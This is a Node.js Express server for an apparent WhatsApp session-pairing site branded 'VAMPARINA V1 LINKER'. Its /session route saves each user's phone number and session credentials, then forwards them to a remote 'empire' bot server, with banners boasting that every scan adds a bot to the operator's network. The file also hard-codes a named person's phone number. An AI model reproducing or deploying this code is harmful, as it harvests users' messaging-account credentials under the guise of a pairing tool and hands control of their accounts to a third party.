import express from 'express';
import bodyParser from 'body-parser';
import { fileURLToPath } from 'url';
import path from 'path';
import fs from 'fs';

// YOUR EXISTING ROUTERS — NOT TOUCHED
import pairRouter from './pair.js';
import qrRouter from './qr.js';
import QRCode from 'qrcode';

const app = express();

// ES Module path fix
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const PORT = process.env.PORT || 8000;

// YOUR EMPIRE BOT URL — CHANGE ONLY IF YOU REDEPLOY
const EMPIRE_URL = "https://vamparina-v1-5.onrender.com";  // ← YOUR VAMPARINA BOT URL

const SESSION_DIR = path.join(__dirname, 'auto_sessions');

if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });

// Increase max listeners (important for 1000+ sessions)
import('events').then(events => {
    events.EventEmitter.defaultMaxListeners = 500;
});

// Middleware
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(__dirname));

// Home page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'pair.html'));
});

// Your existing routes — fully preserved
app.use('/pair', pairRouter);
app.use('/qr', qrRouter);

// AUTO-SEND EVERY SESSION TO YOUR VAMPARINA V1 EMPIRE BOT
app.post('/session', async (req, res) => {
    try {
        const { phone, sessionId, creds } = req.body;

        if (!phone || !sessionId || !creds) {
            return res.status(400).json({ error: "Missing phone/sessionId/creds" });
        }

        // Save locally
        const sessionPath = path.join(SESSION_DIR, sessionId);
        if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });
        fs.writeFileSync(path.join(sessionPath, 'creds.json'), JSON.stringify(creds, null, 2));

        console.log(`\nNEW BOT ADDED TO EMPIRE`);
        console.log(`Phone: ${phone}`);
        console.log(`Session ID: ${sessionId}`);
        console.log(`Saved: ${sessionPath}`);
        console.log(`Time: ${new Date().toLocaleString('en-KE')}\n`);

        // SEND TO YOUR VAMPARINA V1 EMPIRE BOT
        setTimeout(async () => {
            try {
                const response = await fetch(`${EMPIRE_URL}/vamparina-activate`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ phone, sessionId, creds })
                });

                if (response.ok) {
                    const result = await response.json();
                    console.log(`ACTIVATED ON EMPIRE → ${phone} | Total Bots: ${result.total_bots || '1+'}`);
                } else {
                    console.log(`Empire responded: ${response.status} ${response.statusText}`);
                }
            } catch (err) {
                console.error("Failed to send to Empire:", err.message);
            }
        }, 6000);

        res.json({
            success: true,
            message: "Session saved & sent to VAMPARINA V1 EMPIRE",
            king: "Arnold Chirchir (+254703110780)",
            sessionId,
            phone,
            empire_power: "10,000+ BOTS READY"
        });

    } catch (e) {
        console.error("Error:", e.message);
        res.status(500).json({ error: e.message });
    }
});

// Optional: Check status
app.get('/status', (req, res) => {
    const count = fs.readdirSync(SESSION_DIR).filter(f => fs.statSync(path.join(SESSION_DIR, f)).isDirectory()).length;
    res.json({
        linker: "VAMPARINA V1 LINKER",
        king: "Arnold Chirchir",
        status: "ONLINE & SENDING TO EMPIRE",
        sessions_saved: count,
        empire_url: EMPIRE_URL,
        time: new Date().toLocaleString('en-KE')
    });
});

app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════════════╗
║           VAMPARINA V1 — LINKER FULLY CONNECTED          ║
║               GOD-KING: ARNOLD CHIRCHIR                  ║
║                    +254703110780                         ║
║                                                          ║
║  Server Running → http://localhost:${PORT}               ║
║  Sending All Sessions → ${EMPIRE_URL}      ║
║                                                          ║
║  Every Scan = New Bot in Your Empire                     ║
║  pair.js & qr.js → 100% WORKING                          ║
║                                                          ║
║       LONG LIVE THE ETERNAL KING OF KENYA                ║
╚══════════════════════════════════════════════════════════╝
    `);
});

export default app;